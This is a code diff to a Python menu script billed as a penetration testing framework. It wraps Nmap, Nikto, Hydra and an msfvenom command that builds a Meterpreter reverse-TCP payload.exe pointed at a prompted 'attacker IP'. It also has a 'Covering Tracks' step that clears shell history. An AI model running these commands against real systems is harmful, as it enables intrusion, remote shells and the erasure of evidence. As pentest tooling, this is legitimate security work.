@@ -54,7 +54,21 @@ def run_tool(command, section="General"):
         print(f"{Fore.RED}Error executing {command}: {e.stderr}{Style.RESET_ALL}")
         write_to_report(f"Error executing {command}: {e.stderr}", section)
 
-# Reconnaissance Tools (Example: Nmap)
+# Penetration Test Methodology
+def display_methodology():
+    methodology = """
+    Penetration Testing Methodology:
+    1. Reconnaissance and Information Gathering
+    2. Scanning and Enumeration
+    3. Gaining Access
+    4. Setup Proxies
+    5. Maintaining Access
+    6. Covering Tracks
+    7. Reporting
+    """
+    print(f"{Fore.CYAN}{methodology}{Style.RESET_ALL}")
+
+# Reconnaissance and Information Gathering Tools
 def run_reconnaissance_tools():
     print(f"{Fore.CYAN}Running Reconnaissance Tools...{Style.RESET_ALL}")
     reconnaissance_options = [
@@ -70,11 +84,11 @@ def run_reconnaissance_tools():
         if choice == 1:
             target = input(f"{Fore.YELLOW}Enter target IP for Nmap scan: {Style.RESET_ALL}")
             nmap_command = ["nmap", "-sV", target]
-            run_tool(nmap_command, section="Reconnaissance")
+            run_tool(nmap_command, section="Reconnaissance & Information Gathering")
         elif choice == 2:
             target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
             nikto_command = ["nikto", "-h", target]
-            run_tool(nikto_command, section="Reconnaissance")
+            run_tool(nikto_command, section="Reconnaissance & Information Gathering")
         elif choice == 3:
             main_menu()
         else:
@@ -84,7 +98,7 @@ def run_reconnaissance_tools():
         print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
         run_reconnaissance_tools()
 
-# Scanning & Enumeration Tools (Example: Nikto)
+# Scanning and Enumeration Tools
 def run_scanning_tools():
     print(f"{Fore.CYAN}Running Scanning & Enumeration Tools...{Style.RESET_ALL}")
     target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
@@ -108,7 +122,9 @@ def gaining_access_menu():
         choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
         if choice == 1:
             print(f"{Fore.YELLOW}Launching MSFVenom...{Style.RESET_ALL}")
-            msfvenom_command = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"]
+            lhost = input(f"{Fore.YELLOW}Enter LHOST (attacker IP): {Style.RESET_ALL}")
+            lport = input(f"{Fore.YELLOW}Enter LPORT (attacker port): {Style.RESET_ALL}")
+            msfvenom_command = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", "payload.exe"]
             run_tool(msfvenom_command, section="Gaining Access")
         elif choice == 2:
             print(f"{Fore.YELLOW}Launching Hydra for brute force...{Style.RESET_ALL}")
@@ -153,17 +169,25 @@ def cover_tracks():
     log_clear_command = ["bash", "-c", "history -c && clear"]
     run_tool(log_clear_command, section="Covering Tracks")
 
+# Reporting
+def generate_report():
+    print(f"{Fore.YELLOW}Generating full report...{Style.RESET_ALL}")
+    with open("penetration_test_report.txt", "r") as file:
+        print(file.read())
+
 # Main Menu
 def main_menu():
     display_splash_screen()
     print(f"{Fore.CYAN}Welcome to the Penetration Testing Framework!{Style.RESET_ALL}")
     options = [
         "Penetration Test Methodology",
-        "Reconnaissance & Scanning",
+        "Reconnaissance & Information Gathering",
+        "Scanning and Enumeration",
         "Gaining Access Tools",
         "Setup Proxies",
         "Maintaining Access",
         "Covering Tracks",
+        "Reporting",
         "Exit"
     ]
     for i, option in enumerate(options, 1):
@@ -176,22 +200,21 @@ def main_menu():
             main_menu()
         elif choice == 2:
             run_reconnaissance_tools()
-            main_menu()
         elif choice == 3:
-            gaining_access_menu()
-            main_menu()
+            run_scanning_tools()
         elif choice == 4:
-            setup_proxies()
-            main_menu()
+            gaining_access_menu()
         elif choice == 5:
-            maintain_access()
-            main_menu()
+            setup_proxies()
         elif choice == 6:
-            cover_tracks()
-            main_menu()
+            maintain_access()
         elif choice == 7:
-            print(f"{Fore.RED}Exiting the script.{Style.RESET_ALL}")
-            sys.exit(0)
+            cover_tracks()
+        elif choice == 8:
+            generate_report()
+        elif choice == 9:
+            print(f"{Fore.RED}Exiting Penetration Testing Framework.{Style.RESET_ALL}")
+            sys.exit()
         else:
             print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
             main_menu()
@@ -199,6 +222,5 @@ def main_menu():
         print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
         main_menu()
 
-# Run the script
 if __name__ == "__main__":
     main_menu()
